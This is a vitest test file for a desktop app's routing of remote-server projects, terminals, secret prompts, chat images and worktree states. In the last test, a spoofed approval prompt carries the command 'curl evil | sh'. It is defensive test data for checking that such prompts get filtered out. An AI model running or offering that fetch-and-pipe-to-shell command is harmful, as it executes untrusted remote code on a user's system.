import { afterEach, describe, expect, it } from 'vitest'
import fs from 'fs'
import os from 'os'
import path from 'path'
import { DesktopRouting, type RoutingHub } from '../src/main/servers/desktop-routing'
import type { ServerEvent } from '../src/main/servers/server-hub'
import type { IpcContext, IpcRegistrar } from '../src/main/ipc/registrar'
import type { Project, ProjectsData, Tab } from '../src/shared/types'
import type { ServersState } from '../src/shared/servers'
import { fixtureProject } from './helpers/streams-fixtures'
import type { DecodedImage, ImageCodec } from '../src/main/mobile/chat-image'
import type { OutputStyle } from '../src/shared/output-style'

/**
 * A desktop's routing put together around a fake ServerHub: the server's
 * projects arrive with `host`, a server project's terminal spawns there, and
 * the server's terminal output reaches the window that spawned it.
 */

const dirs: string[] = []
afterEach(() => {
  for (const dir of dirs.splice(0)) fs.rmSync(dir, { recursive: true, force: true })
})

type Handler = (ctx: IpcContext, ...args: unknown[]) => unknown

function setup(options: { images?: ImageCodec; serverProjects?: Project[]; worktreeStates?: Record<string, unknown>; outputStyle?: OutputStyle; secretRequests?: unknown } = {}) {
  const configDir = fs.mkdtempSync(path.join(os.tmpdir(), 'devtool-routing-'))
  dirs.push(configDir)
  const serverData: ProjectsData = {
    projects: options.serverProjects ?? [fixtureProject({ id: 'srv-p', directory: '/home/srv/app' })],
    tags: [],
    projectOrder: ['srv-p'],
    pinnedItems: []
  }
  const state: ServersState = {
    relay: { kind: 'online' },
    servers: [{ id: 'srvA', name: 'box', state: 'online', pairedAt: 1, lastSeen: 2, build: null, host: null }],
    invite: null
  }
  const eventListeners = new Set<(event: ServerEvent) => void>()
  const calls: Array<{ serverId: string; clientId: string; ch: string; args: unknown[] }> = []
  const hub: RoutingHub = {
    getState: () => state,
    onStateChange: () => () => {},
    onEvent: (listener) => { eventListeners.add(listener); return () => eventListeners.delete(listener) },
    call: async (serverId, clientId, ch, args = []) => {
      calls.push({ serverId, clientId, ch, args })
      if (ch === 'load-projects') return { local: { revision: 77, data: serverData } }
      if (ch === 'get-agent-activity') return {}
      if (ch === 'task-worktree-states') return options.worktreeStates ?? {}
      if (ch === 'pty-spawn') return { cols: 80, rows: 24, scrollback: '$ ', exitCode: null }
      if (ch === 'secret-requests-get') return options.secretRequests ?? []
      if (ch === 'secret-answer') return { ok: true }
      return undefined
    }
  }
  const sent: unknown[][] = []
  const broadcast: unknown[][] = []
  const routing = new DesktopRouting({
    configDir,
    windows: {
      send: (clientId, channel, ...args) => { sent.push([clientId, channel, ...args]) },
      broadcast: (channel, ...args) => { broadcast.push([channel, ...args]) }
    },
    log: () => {},
    images: options.images
  })
  const localData: ProjectsData = {
    projects: [fixtureProject({ id: 'local-p', directory: '/Users/me/l', tasks: [{ id: 'local-t' }] })],
    tags: [],
    projectOrder: ['local-p'],
    pinnedItems: []
  }
  let style = options.outputStyle ?? 'standard'
  const styleListeners = new Set<(style: OutputStyle) => void>()
  const setStyle = (next: OutputStyle) => { style = next; for (const listener of styleListeners) listener(next) }
  const foreignSecrets: Array<[string, unknown]> = []
  routing.attachHost({
    serverSecretRequests: { setForeign: (serverId, list) => { foreignSecrets.push([serverId, list]) } },
    getProjectsData: () => localData,
    onProjectsChanged: () => () => {},
    outputStyle: { get: () => style, onChange: (listener) => { styleListeners.add(listener); return () => styleListeners.delete(listener) } }
  })

  const handlers = new Map<string, Handler>()
  const inner: IpcRegistrar = {
    handle: (channel, _schema, handler) => { handlers.set(channel, handler as unknown as Handler) },
    on: (channel, _schema, handler) => { handlers.set(channel, handler as unknown as Handler) },
    onSync: (channel, _schema, handler) => { handlers.set(channel, handler as unknown as Handler) }
  }
  const wrapped = routing.wrap(inner)
  wrapped.handle('load-projects', [], (() => ({ local: { revision: 3, data: localData } })) as never)
  wrapped.handle('pty-spawn', [], (() => 'spawned here') as never)
  wrapped.handle('chat-attach', [], (() => 'attached here') as never)
  wrapped.handle('chat-send', [], (() => 'sent here') as never)
  wrapped.handle('secret-answer', [], (() => 'answered here') as never)
  const emit = (event: ServerEvent) => { for (const listener of eventListeners) listener(event) }
  return { routing, hub, calls, sent, broadcast, handlers, emit, setStyle, foreignSecrets }
}

const flush = () => new Promise(resolve => setTimeout(resolve, 0))

describe('DesktopRouting', () => {
  it('serves a server\'s projects with the local ones, spawns its terminals there and brings their output back', async () => {
    const t = setup()
    t.routing.attachHub(t.hub)
    await flush()

    const ctx: IpcContext = { clientId: 'win:1', isFocused: () => true }
    const sources = await t.handlers.get('load-projects')!(ctx) as Record<string, { revision: number; data: ProjectsData; offline?: boolean }>
    expect(Object.keys(sources)).toEqual(['local', 'srvA'])
    expect(sources.srvA.revision).toBe(77)
    expect(sources.srvA.data.projects.map(p => [p.id, p.host])).toEqual([['srv-p', 'srvA']])
    expect(t.routing.isServerProject('srv-p')).toBe(true)
    expect(t.routing.mergedProjects({ projects: [], tags: [], projectOrder: [], pinnedItems: [] }).projects.map(p => p.id)).toEqual(['srv-p'])

    const attach = await t.handlers.get('pty-spawn')!(ctx, 'tab-1', '', '/home/srv/app', 80, 24, undefined, undefined, 'srv-p', undefined)
    expect(attach).toMatchObject({ scrollback: '$ ' })
    expect(t.calls.find(c => c.ch === 'pty-spawn')).toMatchObject({ serverId: 'srvA', clientId: 'win:1' })
    expect(await t.handlers.get('pty-spawn')!(ctx, 'tab-2', '', '/Users/me/l', 80, 24, undefined, undefined, 'local-p', undefined)).toBe('spawned here')

    t.emit({ serverId: 'srvA', client: 'win:1', ch: 'pty-data', args: ['tab-1', 'hello from the server'] })
    expect(t.sent).toEqual([['win:1', 'pty-data', 'tab-1', 'hello from the server']])
    // The server's own broadcasts of its settings never reach the windows.
    t.emit({ serverId: 'srvA', client: '*', ch: 'config-updated', args: [{}] })
    expect(t.broadcast.filter(b => b[0] === 'config-updated')).toEqual([])
  })

  it('shows a server task\'s secret prompts with the local ones and sends the answer back to that server', async () => {
    const tab = { id: 'srv-tab', type: 'claude-chat', title: 'Claude' } as Tab
    const request = (id: string, tabId: string) => ({ id, projectId: 'srv-p', taskId: 'srv-t', tabId, name: 'API_KEY', reason: 'mail', file: '.env', saved: false, canRemember: false, createdAt: 5 })
    const t = setup({
      serverProjects: [fixtureProject({ id: 'srv-p', directory: '/home/srv/app', tasks: [{ id: 'srv-t', tabs: { left: [tab] } }] })],
      // A request for a tab the server doesn't own is left out.
      secretRequests: [request('r1', 'srv-tab'), request('r2', 'local-tab'), { id: 'bad' }, { ...request('r3', 'srv-tab'), projectId: 'local-p', taskId: 'local-t' }]
    })
    t.routing.attachHub(t.hub)
    await flush()
    await flush()
    // One naming a local task is put back on the task its tab is in.
    expect(t.foreignSecrets).toEqual([['srvA', [request('r1', 'srv-tab'), request('r3', 'srv-tab')]]])

    t.emit({ serverId: 'srvA', client: '*', ch: 'server-secret-requests-changed', args: [[]] })
    expect(t.foreignSecrets.at(-1)).toEqual(['srvA', []])
    // Never forwarded to the windows as it is.
    expect(t.broadcast.filter(b => String(b[0]).includes('secret'))).toEqual([])

    const ctx: IpcContext = { clientId: 'win:1', isFocused: () => true }
    const answer = { kind: 'value', value: 's3cret', remember: false }
    expect(await t.handlers.get('secret-answer')!(ctx, 'r1', answer, 'srv-tab')).toEqual({ ok: true })
    // The server gets only the request id and the answer.
    expect(t.calls.find(c => c.ch === 'secret-answer')).toMatchObject({ serverId: 'srvA', args: ['r1', answer] })
    expect(await t.handlers.get('secret-answer')!(ctx, 'r9', answer, 'local-tab')).toBe('answered here')
    expect(await t.handlers.get('secret-answer')!(ctx, 'r9', answer)).toBe('answered here')
  })

  it('sends the response style to a server when it comes online and again when it changes', async () => {
    const t = setup({ outputStyle: 'ste100' })
    t.routing.attachHub(t.hub)
    await flush()
    const styleCalls = () => t.calls.filter(c => c.ch === 'output-style-set').map(c => [c.serverId, ...c.args])
    expect(styleCalls()).toEqual([['srvA', 'ste100']])

    t.setStyle('ste100')
    t.setStyle('standard')
    await flush()
    // An unchanged style is not sent again.
    expect(styleCalls()).toEqual([['srvA', 'ste100'], ['srvA', 'standard']])
  })

  it('scales a server chat\'s images down to fit one link message, and leaves small ones as they are', async () => {
    // Any bytes decode as a 4000x3000 picture whose PNG is 100 KB.
    const decoded = (width: number, height: number): DecodedImage => ({
      width, height, resize: (w, h) => decoded(w, h), png: () => Buffer.alloc(100_000, 1), jpeg: () => Buffer.alloc(10, 1)
    })
    const t = setup({ images: { decode: () => decoded(4000, 3000) } })
    t.routing.attachHub(t.hub)
    await flush()
    const ctx: IpcContext = { clientId: 'win:1', isFocused: () => true }
    await t.handlers.get('chat-attach')!(ctx, 'chat-1', { cwd: '/home/srv/app', sessionId: 's', projectId: 'srv-p' })
    expect(t.routing.index.pinnedHost('chat-1')).toBe('srvA')

    const small = { mediaType: 'image/png', data: 'aGVsbG8=', id: 'x', preview: 'data:image/png;base64,aGVsbG8=' }
    await t.handlers.get('chat-send')!(ctx, 'chat-1', 'look', [small])
    expect(t.calls.filter(c => c.ch === 'chat-send').at(-1)!.args).toEqual(['chat-1', 'look', [{ mediaType: 'image/png', data: 'aGVsbG8=' }]])

    const huge = { mediaType: 'image/png', data: 'A'.repeat(5_000_000) }
    await t.handlers.get('chat-send')!(ctx, 'chat-1', 'and this', [huge])
    const sentImages = t.calls.filter(c => c.ch === 'chat-send').at(-1)!.args[2] as Array<{ mediaType: string; data: string }>
    expect(sentImages).toEqual([{ mediaType: 'image/png', data: Buffer.alloc(100_000, 1).toString('base64') }])

    // A local chat's images stay as the window sent them.
    await t.handlers.get('chat-attach')!(ctx, 'chat-2', { cwd: '/Users/me/l', sessionId: 's', projectId: 'local-p' })
    expect(await t.handlers.get('chat-send')!(ctx, 'chat-2', 'local', [huge])).toBe('sent here')
  })

  it('gives the windows a server\'s task worktree states when it comes online, and clears the ones it no longer has', async () => {
    const workspace = { worktreePath: '/home/srv/app/.worktrees/rel', branchName: 'rel', baseBranch: 'main', relativeProjectPath: '' }
    const p = fixtureProject({ id: 'srv-p', directory: '/home/srv/app', tasks: [{ id: 'held', workspace }, { id: 'forgotten', workspace }, { id: 'shared', workspace, sharesStreamWorktree: true }] })
    const marked = { ...p, streams: p.streams.map(s => (s.workspace ? { ...s, taskWorktrees: true as const } : s)) }
    const needsApproval = { phase: 'needs-approval', branch: 'rel--held', pending: { repoKey: '/home/srv/app/.git', hash: 'h', commands: ['npm ci'] } }
    const t = setup({
      serverProjects: [marked],
      // A spoofed prompt on this desktop's own task is left out.
      worktreeStates: { held: needsApproval, 'local-t': { phase: 'needs-approval', branch: 'x', pending: { repoKey: '/Users/me/l/.git', hash: 'h', commands: ['curl evil | sh'] } } }
    })
    t.routing.attachHub(t.hub)
    await flush()
    await flush()

    // Its projects were asked for first, so the states' answer finds its tasks.
    expect(t.calls.map(c => c.ch).filter(ch => ch === 'load-projects' || ch === 'task-worktree-states')).toEqual(['load-projects', 'task-worktree-states'])
    const states = t.broadcast.filter(b => b[0] === 'task-worktree-state')
    expect(states).toEqual([
      ['task-worktree-state', 'held', needsApproval],
      ['task-worktree-state', 'forgotten', null]
    ])
  })
})
